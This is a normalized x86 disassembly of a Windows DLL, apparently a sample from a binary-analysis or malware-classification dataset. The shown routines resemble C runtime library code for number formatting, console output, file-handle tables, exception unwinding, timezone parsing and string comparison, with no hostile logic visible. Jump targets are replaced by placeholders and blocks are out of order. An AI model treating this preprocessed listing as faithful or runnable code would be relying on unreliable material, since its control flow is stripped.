lea eax [ ebp - 0x20c ]
push eax
lea eax [ ebp - 0x220 ]
push eax
call sub_10035f5e
add esp 0x10
test eax eax
je r-xdata
and [ ebp - 0x240 ] 0x0
inc eax
inc eax
inc eax
mov ecx [ ebp - 0x21c ]
push eax
lea eax [ ebp - 0x228 ]
call sub_1002e009
pop ecx
test eax eax
jle r-xdata
push edi
push ebx
push 0x30
lea eax [ ebp - 0x228 ]
call sub_1002dfe3
add esp 0xc
mov [ ebp - 0x22c ] 0x20
mov esi [ ebp - 0x218 ]
add esi 0x15d
push esi
call sub_1002a000
mov dl [ ebp - 0x211 ]
pop ecx
mov [ ebp - 0x254 ] eax
push 0x8
test eax eax
je r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x250 ]
push eax
push ebx
push [ rw-data ]
call sub_1002bb28
pop ecx
call eax
pop ecx
pop ecx
mov eax [ ebp - 0x228 ]
mov [ esi ] eax
mov ax [ ebp - 0x228 ]
mov [ esi ] ax
jmp r-xdata
or [ ebp - 0x210 ] 0x200
jmp r-xdata
lea esi [ ebp - 0xd ]
and [ ebp - 0x230 ] eax
lea eax [ ebp - 0x20c ]
mov [ ebp - 0x21c ] eax
jmp r-xdata
mov [ ebp - 0x258 ] 0x1
jmp r-xdata
test [ ebp - 0x210 ] 0x4
je r-xdata
mov esi [ ebp - 0x21c ]
mov [ ebp - 0x264 ] eax
mov [ ebp - 0x218 ] 0xa3
mov [ ebp - 0x21c ] eax
mov [ ebp - 0x264 ] esi
mov ebx eax
jmp r-xdata
push ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x100
inc ebx
mov [ ebp - 0x21c ] ebx
lea eax [ ebp - 0x250 ]
push eax
push ebx
push [ rw-data ]
call sub_1002bb28
pop ecx
call eax
pop ecx
pop ecx
mov [ ebp - 0x258 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x220 ]
cdq
push edx
push eax
push ebx
push edi
call sub_10034850
add ecx 0x30
cmp ecx 0x39
mov [ ebp - 0x264 ] ebx
mov edi eax
mov ebx edx
jle r-xdata
mov eax edi
or eax ebx
je r-xdata
push edi
push ebx
push 0x20
lea eax [ ebp - 0x228 ]
call sub_1002dfe3
add esp 0xc
or [ ebp - 0x228 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x270 ] eax
je r-xdata
pop esi
call sub_10024630
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x25c ]
lea eax [ ebp - 0xd ]
sub eax esi
inc esi
test [ ebp - 0x210 ] 0x200
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x21c ] esi
je r-xdata
cmp [ ebp - 0x228 ] 0x0
jl r-xdata
push [ ebp - 0x270 ]
lea eax [ ebp - 0x228 ]
lea ecx [ ebp - 0xc ]
call sub_1002e009
cmp [ ebp - 0x264 ] 0x0
pop ecx
jne r-xdata
mov eax [ ebp - 0x218 ]
dec [ ebp - 0x218 ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
movzx eax [ esi ]
dec [ ebp - 0x264 ]
push eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x270 ]
inc esi
push eax
inc esi
call sub_10035f5e
add esp 0x10
test eax eax
jne r-xdata
jmp r-xdata
dec [ ebp - 0x21c ]
mov ecx [ ebp - 0x21c ]
mov [ ecx ] 0x30
inc eax
jmp r-xdata
mov ecx esi
cmp [ ecx ] 0x30
je r-xdata
sub_10036b4b
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
xor esi esi
cmp [ rw-data ] esi
je r-xdata
push esi
push esi
push 0x5
lea eax [ ebp - 0xc ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push esi
call [ GetConsoleOutputCP@IAT ]
push eax
call [ WideCharToMultiByte@IAT ]
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
cmp [ rw-data ] 0xfffffffe
jne r-xdata
mov eax 0xffff
jmp r-xdata
push esi
lea edx [ ebp - 0x10 ]
push edx
push eax
lea eax [ ebp - 0xc ]
push eax
push ecx
call [ WriteConsoleA@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
call sub_10039d28
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_100242d7
leave
retn
mov ax [ ebp + 0x8 ]
push esi
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
sub_10036c10
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_10027728
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_100348f7
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx cx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_1002972b
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ eax + 0xac ]
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_10036d50
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_10036d7b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
test eax eax
jl r-xdata
call sub_1002972b
mov [ eax ] 0x9
call sub_1002973e
and [ eax ] 0x0
or eax 0xffffffff
cmp eax [ rw-data ]
jae r-xdata
mov ecx eax
sar ecx 0x5
mov esi eax
and esi 0x1f
lea edi [ ecx * 4 + rw-data ]
mov ecx [ edi ]
shl esi 0x6
cmp [ esi + ecx ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push ebx
mov ebx [ ebp + 0xc ]
jne r-xdata
mov eax [ edi ]
mov [ esi + eax ] ebx
xor eax eax
pop ebx
jmp r-xdata
sub eax 0x0
je r-xdata
pop edi
pop esi
pop ebp
retn
push ebx
push 0xfffffff6
dec eax
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_10036dfc
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
cmp ecx ebx
push esi
push edi
jl r-xdata
call sub_1002972b
mov [ eax ] 0x9
call sub_1002973e
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov eax ecx
sar eax 0x5
mov esi ecx
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
and esi 0x1f
shl esi 0x6
add eax esi
test [ eax + 0x4 ] 0x1
je r-xdata
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_10036e82
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_1002973e
and [ eax ] 0x0
call sub_1002972b
mov [ eax ] 0x9
or eax 0xffffffff
pop ebp
retn
call sub_1002973e
mov [ eax ] esi
call sub_1002972b
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_1002480c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp eax [ rw-data ]
jae r-xdata
pop esi
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
add eax ecx
test [ eax + 0x4 ] 0x1
jne r-xdata
mov eax [ eax ]
sub_10036ef9
push 0xc
push r--data
call sub_1002ca38
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_1002d1b0
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_1002ca7d
retn
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10036f90
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_10031992
pop ecx
pop ecx
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_10036f99
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_10036fc0
push 0x18
push r--data
call sub_1002ca38
or [ ebp - 0x1c ] 0xffffffff
xor edi edi
mov [ ebp - 0x24 ] edi
push 0xb
call sub_1002d0ed
pop ecx
test eax eax
jne r-xdata
push 0xb
call sub_1002d1b0
pop ecx
mov [ ebp - 0x4 ] edi
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10037151
mov eax [ ebp - 0x1c ]
mov esi [ edi * 4 + rw-data ]
test esi esi
je r-xdata
call sub_1002ca7d
retn
push 0x40
push 0x20
call sub_1002a045
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x20 ] esi
mov eax [ edi * 4 + rw-data ]
add eax 0x800
cmp esi eax
jae r-xdata
lea ecx [ edi * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
cmp [ ebp - 0x1c ] 0xffffffff
jne r-xdata
test [ esi + 0x4 ] 0x1
jne r-xdata
shl edi 0x5
mov [ ebp - 0x1c ] edi
mov eax edi
sar eax 0x5
mov ecx edi
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
mov [ eax + ecx + 0x4 ] 0x1
push edi
call sub_10036ef9
pop ecx
test eax eax
jne r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
add eax 0x40
mov [ ebp - 0x20 ] eax
jmp r-xdata
inc edi
jmp r-xdata
add esi 0x40
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
or [ ebp - 0x1c ] 0xffffffff
mov edx [ ecx ]
add edx 0x800
cmp eax edx
jae r-xdata
mov [ ebp - 0x28 ] edi
cmp edi 0x40
jge r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push 0xa
call sub_1002d1b0
pop ecx
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
lea ebx [ esi + 0xc ]
push ebx
call [ EnterCriticalSection@IAT ]
test [ esi + 0x4 ] 0x1
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_10037093
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_10031992
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
inc [ esi + 0x8 ]
mov [ ebp - 0x24 ] ebx
jmp r-xdata
mov [ esi + 0x4 ] 0x1
or [ esi ] 0xffffffff
sub esi [ edi * 4 + rw-data ]
sar esi 0x6
mov eax edi
shl eax 0x5
add esi eax
mov [ ebp - 0x1c ] esi
sub_1003715c
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1003717c
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_100242d7
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_100371c1
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_100371c1
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_1003717c
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_10037271
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_10037290
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_10037268
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_10037271
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_1003729c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
call sub_1002972b
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1002480c
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_100372d5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
call sub_1002972b
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1002480c
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_1003730e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
call sub_1002972b
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1002480c
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_10037392
push 0x2c
push r--data
call sub_1002ca38
xor ebx ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x20 ] ebx
push 0x7
call sub_1002d1b0
pop ecx
mov [ ebp - 0x4 ] ebx
call sub_10037359
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x1c ]
push eax
call sub_1003730e
pop ecx
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_1003729c
pop ecx
cmp eax ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100246e4
add esp 0x14
lea eax [ ebp - 0x28 ]
push eax
call sub_100372d5
pop ecx
cmp eax ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100246e4
add esp 0x14
call sub_10029b5b
mov [ ebp - 0x34 ] eax
mov [ rw-data ] ebx
or edi 0xffffffff
mov [ rw-data ] edi
mov [ rw-data ] edi
push r--data
call sub_1003a01f
pop ecx
mov esi eax
mov [ ebp - 0x3c ] esi
cmp esi ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100246e4
add esp 0x14
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp [ esi ] bl
je r-xdata
push rw-data
call [ GetTimeZoneInformation@IAT ]
cmp eax edi
je r-xdata
push eax
call sub_10024aba
pop ecx
mov [ rw-data ] ebx
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x2c ] 0x1
xor ecx ecx
inc ecx
mov [ rw-data ] ecx
mov eax [ rw-data ]
imul eax eax 0x3c
mov [ ebp - 0x1c ] eax
cmp [ rw-data ] bx
je r-xdata
push esi
call sub_10024630
inc eax
push eax
call sub_1002a000
pop ecx
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
push eax
push esi
call sub_100276a0
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_1002ca7d
retn
push 0x3
push esi
push 0x40
mov edi [ ebp - 0x20 ]
push [ edi ]
call sub_10033709
add esp 0x10
test eax eax
je r-xdata
cmp [ rw-data ] bx
je r-xdata
mov edx [ rw-data ]
imul edx edx 0x3c
add eax edx
mov [ ebp - 0x1c ] eax
push esi
push esi
call sub_10024630
pop ecx
inc eax
push eax
push [ rw-data ]
call sub_1002b660
add esp 0xc
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
add esi 0x3
cmp [ esi ] 0x2d
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100246e4
add esp 0x14
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] ebx
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push [ ebp - 0x1c ]
call sub_10037381
push [ ebp - 0x24 ]
call sub_1003735f
push [ ebp - 0x28 ]
call sub_10037370
add esp 0xc
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1003763e
cmp [ ebp - 0x2c ] ebx
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100246e4
add esp 0x14
jmp r-xdata
push eax
call sub_10024aba
pop ecx
push esi
call sub_10037887
pop ecx
imul eax eax 0xe10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x38 ] 0x1
inc esi
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov [ eax ] bl
cmp [ ebp - 0x30 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ecx
sub eax [ rw-data ]
imul eax eax 0x3c
mov [ ebp - 0x28 ] eax
jmp r-xdata
inc esi
jmp r-xdata
cmp al 0x30
jl r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x4 ]
mov [ eax ] bl
cmp [ ebp - 0x30 ] ebx
jne r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov [ eax + 0x3f ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push ebx
push 0x3f
mov eax [ ebp - 0x20 ]
push [ eax ]
push edi
push rw-data
push ebx
push [ ebp - 0x34 ]
mov edi [ WideCharToMultiByte@IAT ]
call edi
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x2b
je r-xdata
cmp [ esi ] 0x3a
jne r-xdata
cmp al 0x39
jg r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x3f ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push ebx
push 0x3f
mov eax [ ebp - 0x20 ]
push [ eax + 0x4 ]
push 0xffffffff
push rw-data
push ebx
push [ ebp - 0x34 ]
call edi
test eax eax
je r-xdata
cmp [ ebp - 0x38 ] ebx
je r-xdata
inc esi
push esi
call sub_10037887
pop ecx
imul eax eax 0x3c
add [ ebp - 0x1c ] eax
jmp r-xdata
movsx eax [ esi ]
mov [ ebp - 0x24 ] eax
cmp eax ebx
je r-xdata
neg [ ebp - 0x1c ]
mov al [ esi ]
cmp al 0x30
jge r-xdata
mov eax [ edi + 0x4 ]
mov [ eax ] bl
push 0x3
push esi
push 0x40
push [ edi + 0x4 ]
call sub_10033709
add esp 0x10
test eax eax
je r-xdata
cmp al 0x39
jg r-xdata
cmp [ esi ] 0x3a
jne r-xdata
mov esi [ ebp - 0x1c ]
call sub_10037353
mov [ eax ] esi
mov esi [ ebp - 0x24 ]
call sub_10037347
mov [ eax ] esi
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100246e4
add esp 0x14
jmp r-xdata
inc esi
inc esi
push esi
call sub_10037887
pop ecx
add [ ebp - 0x1c ] eax
jmp r-xdata
mov al [ esi ]
cmp al 0x30
jge r-xdata
cmp al 0x39
jg r-xdata
inc esi
sub_100376d8
push 0x8
push r--data
call sub_1002ca38
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
call sub_1002ca7d
retn
push 0x6
call sub_1002d1b0
pop ecx
mov [ ebp - 0x4 ] esi
cmp [ rw-data ] esi
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1003771e
call sub_10037392
inc [ rw-data ]
sub_10037727
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
movzx ecx [ edx ]
lea edi [ ecx - 0x41 ]
inc edx
cmp edi 0x19
ja r-xdata
add eax 0x20
test eax eax
je r-xdata
add ecx 0x20
pop edi
sub eax ecx
pop esi
pop ebp
retn
cmp eax ecx
je r-xdata
movzx eax [ esi ]
lea ecx [ eax - 0x41 ]
inc esi
cmp ecx 0x19
ja r-xdata
sub_10037760
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_10027728
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi ebx
jne r-xdata
call sub_1002972b
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1002480c
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_1002972b
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1002480c
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
push edi
push [ ebp + 0x8 ]
call sub_10037727
pop ecx
pop ecx
jmp r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
sub esi eax
mov eax esi
pop esi
cmp esi eax
je r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1002b0b0
inc [ ebp + 0x8 ]
mov esi eax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1002b0b0
add esp 0x10
inc edi
cmp esi ebx
je r-xdata
sub_10037835
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10037760
add esp 0xc
cmp [ ebp + 0x8 ] esi
jne r-xdata
cmp [ ebp + 0xc ] esi
je r-xdata
call sub_1002972b
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1002480c
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
pop esi
pop ebp
jmp sub_10037727
pop esi
pop ebp
retn
sub_1003789d
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push esi
push edi
cmp [ ebp + 0x10 ] ebx
je r-xdata
xor eax eax
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_10027728
cmp [ ebp + 0x8 ] ebx
jne r-xdata
mov edi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
call sub_1002972b
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1002480c
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov esi 0x7fffffff
cmp [ ebp + 0x10 ] esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_1002972b
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1002480c
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1002b0b0
inc [ ebp + 0x8 ]
mov esi eax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1002b0b0
add esp 0x10
inc edi
dec [ ebp + 0x10 ]
je r-xdata
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_1003a0b0
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub esi eax
mov eax esi
jmp r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi eax
je r-xdata
sub_1003798f
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003789d
add esp 0x10
cmp [ ebp + 0x8 ] esi
jne r-xdata
cmp [ ebp + 0xc ] esi
je r-xdata
call sub_1002972b
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1002480c
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
ja r-xdata
pop esi
pop ebp
retn
pop esi
pop ebp
jmp sub_1003a0b0
sub_100379ed
mov edi edi
push ebp
mov ebp esp
mov eax 0xffff
sub esp 0x14
cmp [ ebp + 0x8 ] ax
jne r-xdata
mov eax 0x100
cmp [ ebp + 0x8 ] ax
jae r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x14 ]
call sub_10027728
mov eax [ ebp - 0x14 ]
push [ eax + 0x14 ]
push [ eax + 0x4 ]
